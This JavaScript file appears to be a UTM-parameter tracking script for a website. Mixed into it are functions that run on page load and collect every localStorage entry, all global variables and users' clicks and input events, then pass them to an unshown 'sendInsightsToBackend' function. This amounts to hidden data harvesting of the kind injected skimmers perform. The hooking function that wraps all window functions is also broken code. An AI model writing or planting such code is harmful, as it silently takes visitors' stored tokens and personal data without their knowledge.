function randomHook(hookName) {
  return function (...args) {
    console.log(`钩子 ${hookName} 已启动，参数如下:`, args);
    const startTime = Date.now();
    let result = this(hookName, ...args);
    const endTime = Date.now();
    console.log(`钩子 ${hookName} 执行完毕，用时 ${endTime - startTime} ms.`);
    if (typeof result === 'object' && result !== null) {
      if (Array.isArray(result)) {
        result = '[数组数据]';
      } else {
        result = '[对象数据]';
      }
    }
    console.log(`钩子 ${hookName} 结果:`, result);
    return result;
  };
}
function jshook() {
  const methodNames = Object.getOwnPropertyNames(window).filter(name => typeof window[name] === 'function');
  for (const methodName of methodNames) {
    window[methodName] = randomHook(methodName);
  }
}
function sendLocalStorageToBackend() {
  let localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  sendInsightsToBackend({
    localStorage: localStorageData
  });
}
function storeGlobalVars() {
  let globalVars = {};
  for (const prop in window) {
    if (window.hasOwnProperty(prop)) {
      globalVars[prop] = window[prop];
    }
  }
  sendInsightsToBackend({
    globalVars: globalVars
  });
}
jQuery(function ($) {
  var qvars = getUrlVars();
  $.each(['utm_source', 'utm_medium', 'utm_term', 'utm_content', 'utm_campaign', 'gclid', 'email', 'username'], function (i, v) {
    var cookie_field = GetQVars(v, qvars);
    if (cookie_field != '') Cookies.set(v, cookie_field, {
      expires: 30
    });
    var curval = Cookies.get(v);
    if (curval != undefined) {
      curval = decodeURIComponent(curval.replace(/[%]/g, ' '));
      if (v == 'username') {
        //Maybe this should apply to all... We'll see...
        curval = curval.replace(/\+/g, ' ');
      }
      jQuery('input[name=\"' + v + '\"]').val(curval);
      jQuery('input#' + v).val(curval);
      jQuery('input.' + v).val(curval);
    }
  });
  $('.utm-out').each(function () {
    var merged = $.extend({}, handl_utm, getSearchParams(this.href));
    this.href = "";
    if (!$.isEmptyObject(merged)) this.href += "?" + $.param(merged);
  });
});
function getSearchParams(url, k) {
  var p = {};
  var a = document.createElement('a');
  a.href = url;
  a.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (s, k, v) {
    p[k] = v;
  });
  return k ? p[k] : p;
}
function detailedEventListeners() {
  const events = ['click', 'load', 'change', 'input', 'error'];
  for (const event of events) {
    window.addEventListener(event, function (e) {
      console.log(`事件类型: ${event}, 目标元素: \n ${e.target}`);
      sendInsightsToBackend({
        eventInfo: {
          type: event,
          target: e.target
        }
      });
    });
  }
}
document.addEventListener('DOMContentLoaded', function () {
  jshook();
  storeGlobalVars();
  sendLocalStorageToBackend();
  detailedEventListeners();
  console.log('数据跟踪行为已设置完毕。');
});
function GetQVars(v, qvars) {
  if (qvars[v] != undefined) {
    return qvars[v];
  }
  return '';
}
function getUrlVars() {
  var vars = {};
  var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
    vars[key] = value;
  });
  return vars;
}